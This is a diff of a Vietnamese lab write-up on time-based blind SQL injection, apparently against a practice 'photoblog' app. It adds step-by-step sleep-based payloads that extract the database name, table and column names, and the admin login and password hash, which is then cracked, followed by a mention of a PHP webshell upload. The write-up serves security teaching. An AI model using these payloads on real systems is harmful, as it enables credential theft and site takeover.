@@ -8,7 +8,7 @@
       
      1.2 [Phương pháp sử dụng sqlmap](#pp)
  
-     1.3 [Phương pháp sử dụng sqlmap](#p3)
+     1.3 [Phương pháp manual với BurpSuite](#p3)
      
  2. [Code mô phỏng lỗi](#mp) 
        
@@ -151,8 +151,41 @@
      
  - B7: Sau khi có được `username` và `password` thì chúng ta sẽ đăng nhập vào trang `admin` và nhiệm vụ chúng ta bây giờ là tải lên webshell php. Và các bước sau đó sẽ được thực hiện giống như các bước: Từ ` B10 -> B19` của `Phương pháp manual` ở trên.
 
-<br> 1. Phương Pháp manual với BurpSuite <a name="pp"></a></br>
- - 
+<br> 1. Phương Pháp manual với BurpSuite <a name="p3"></a></br>
+ - Đầu tiên chúng ta sẽ sử dụng câu lệnh `'AND sleep (5) #` để xem thử là database đó là Mysql hay database khác nếu đúng thì nó sẽ trì hoãn thời gian là 5s nhưng chỉ đúng với phiên bản >5 còn nhỏ hơn thì chúng ta nên sử dụng hàm BENCHMARK ().
+
+     ![image](https://user-images.githubusercontent.com/101852647/163553184-f6346ba9-2ad7-480c-b680-dbe5328c5962.png)
+ - Để chắc chắn nó là phiên bản >5 thì chúng ta sử dụng câu lệnh `’ AND IF(substring(VERSION(),1,1) = ‘5’, SLEEP(5), 0)#`
+
+     ![image](https://user-images.githubusercontent.com/101852647/163553518-124a943e-9e24-4471-88fe-31ba3ef6cede.png)
+ - Bây giờ chúng ta sẽ tìm tên của database bằng câu lệnh `’ AND (SELECT sleep(5) from dual where substring(database(),1,1)=’p’)=1#` và thay đổi `...(database(),1,2)=’h’) ` thì sẽ được tên của database là: `photoblog`
+
+     ![image](https://user-images.githubusercontent.com/101852647/163554203-a57d2d0d-f461-4d8e-9acf-90c650580569.png)
+
+ - Sau khi đã có được tên database thì chúng ta sẽ đi tìm các bảng chứa tên đăng nhập và mật khẩu để chúng ta có thể khai thác dữ liệu bên trong bằng câu lệnh `’ AND (SELECT sleep(5) from information_schema.tables where table_name LIKE ‘%admin%’)=1 #`. Bây giờ chúng ta sẽ tìm các bảng với tên như: admin, login, users và thay đổi tên bằng cách thế vào ‘%admin%’ bằng ‘%users%’ . Nếu tên nào có ký tự khớp với ký tự có trong database nó sẽ trì hoãn 5s.
+
+     ![image](https://user-images.githubusercontent.com/101852647/163554806-b5315d2e-2b23-4241-8477-d7f8199bffd0.png)
+
+     ![image](https://user-images.githubusercontent.com/101852647/163554833-df5d0e97-b945-4fb2-9a2c-7a0ea9372ee8.png)
+
+ - Sau khi có được tên bảng cần khai thác thì bây giờ chúng ta sẽ tìm tên các cột có trong bảng đó bằng câu lệnh `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%login%’ AND table_name=’users’)=1 #`.
+
+     ![image](https://user-images.githubusercontent.com/101852647/163555543-31c80995-442e-4120-a932-ff29a4f8699f.png)
+
+ - Tương tự để tìm tên cột tiếp theo `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%password%’ AND table_name=’users’)=1 #`
+
+     ![image](https://user-images.githubusercontent.com/101852647/163555700-d7f65b34-59b2-43bb-9fdb-938495ecb3c6.png)
+ 
+ - Tiếp theo chúng ta sẽ liệt kê tên người dùng câu lệnh `’ AND IF( (select substring(login,1,1) from users limit 0,1)=’a’ , SLEEP(5), 0)#` và cứ tiếp tục thay đổi`(login,1,2) from users limit 0,1)=’d’` cho đến khi được tên user là: `admin`.
+
+     ![image](https://user-images.githubusercontent.com/101852647/163556231-cfbb0254-114d-4e15-8f85-7edd93bf4e49.png)
+
+ - Tương tự như với user thì để tìm được password chúng ta sử dụng câu lệnh `’ AND IF( (select substring(password,1,1) from users limit 0,1)=’a’ , SLEEP(5), 0)#`.
+
+     ![image](https://user-images.githubusercontent.com/101852647/163556439-dba3ae8c-73a7-4004-9c38-08fab15467b8.png)
+
+ - Sau khi đã có được password là:`8efe310f9ab3efeae8d410a8e0166eb2` thì chúng ta sẽ giải mã nó và được passord là: `P4ssw0rd`.
+ 
 #### 2. Code mô phỏng lỗi <a name="mp"></a>
  - Đây là code có lỗi sqli:
  
